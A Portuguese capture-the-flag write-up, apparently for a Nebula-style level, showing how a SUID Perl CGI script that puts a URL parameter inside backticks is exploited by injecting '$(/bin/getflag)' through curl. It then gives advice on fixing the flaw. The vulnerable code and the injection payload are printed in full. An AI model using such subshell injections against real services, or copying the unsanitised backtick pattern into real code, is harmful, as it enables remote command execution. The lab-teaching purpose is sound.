# 𝕃𝕖𝕧𝕖𝕝 𝟘𝟜

## 🎯 Objetivo
O objetivo deste nível é explorar um script Perl (CGI) que está rodando em segundo plano como um serviço web, conseguindo executar comandos arbitrários no sistema (Remote Code Execution) para obter a flag.

## 🔍 Análise da Vulnerabilidade

* **Tipo:** *OS Command Injection* (Injeção de Comando no Sistema Operacional) / *Insecure CGI Script*.
* **Arquivo Alvo:** `level04.pl` (Script Perl com permissão SUID).
* **Comportamento:** Lendo o código-fonte do arquivo `level04.pl`, notamos que ele é um script CGI servido na porta `4747`. A vulnerabilidade crítica está na forma como ele processa a entrada do usuário:
    ```perl
    sub x {
    $y = $_[0];
    print `echo $y 2>&1`;
    }
    x(param("x"));
    ```
    O script pega o parâmetro `x` da URL via `param("x")` e o joga diretamente dentro de crases (``` ` ```). Em Perl, as crases forçam a execução do conteúdo como um comando do sistema operacional. Como não há filtro ou sanitização na variável `$y`, podemos injetar nossos próprios comandos na chamada do `echo`.

## 💻 Passos para Exploração (Exploit)

1.  **Reconhecimento:**
    Listamos os arquivos do diretório para identificar o alvo e suas permissões:
    ```bash
    ls -al
    # Saída:
    # total 16
    # dr-xr-x---+ 1 level04 level04  120 Mar  5  2016 .
    # d--x--x--x  1 root    users    340 Aug 30  2015 ..
    # -r-x------  1 level04 level04  220 Apr  3  2012 .bash_logout
    # -r-x------  1 level04 level04 3518 Aug 30  2015 .bashrc
    # -rwsr-sr-x  1 flag04  level04  152 Mar  5  2016 level04.pl
    # -r-x------  1 level04 level04  675 Apr  3  2012 .profile
    ```
    > Notamos o bit `s` (SUID) ativado no script.

2.  **Identificação do tipo de arquivo:**
    ```bash
    file level04.pl
    # Saída:
    # level04.pl: setuid setgid a /usr/bin/perl script, ASCII text executable
    ```

3.  **Análise do Código-Fonte:**
    Lemos o conteúdo do script para entender a lógica de execução:
    ```bash
    cat level04.pl
    # Saída:
    # #!/usr/bin/perl
    # # localhost:4747
    # use CGI qw{param};
    # print "Content-type: text/html\n\n";
    # sub x {
    #   $y = $_[0];
    #   print `echo $y 2>&1`;
    # }
    # x(param("x"));
    ```
    > A porta 4747 e o parâmetro `x` revelam como devemos interagir com o serviço.

4.  **Injeção de Comando:**
    Utilizamos o `curl` para fazer uma requisição web local na porta 4747. Injetamos uma subshell `$(...)` no parâmetro `x`. A barra invertida (`\`) é usada para "escapar" o cifrão, garantindo que o comando seja enviado intacto para o servidor em vez de ser resolvido pelo nosso terminal local.
    ```bash
    curl "http://localhost:4747/level04.pl?x=\$(/bin/getflag)"
    ```

## 🚩 Solução / Flag
A resposta da requisição web executou o binário e nos devolveu diretamente o token final.

## 🛡️ Prevenção (Como corrigir)
1. **Sanitização de Input**: Nunca confie na entrada do usuário (User Input). Todos os dados recebidos via GET/POST devem ser rigorosamente validados, filtrados e escapados antes de serem usados em qualquer contexto do sistema.

2. **Evitar Chamadas de Sistema Inseguras**: Em vez de usar crases (``` ` ```) ou funções como `system()` e `exec()` para tarefas simples (como imprimir um texto), utilize as funções nativas e seguras da própria linguagem. No caso deste script, o correto seria usar apenas print $y; sem invocar o binário /bin/echo do Linux.
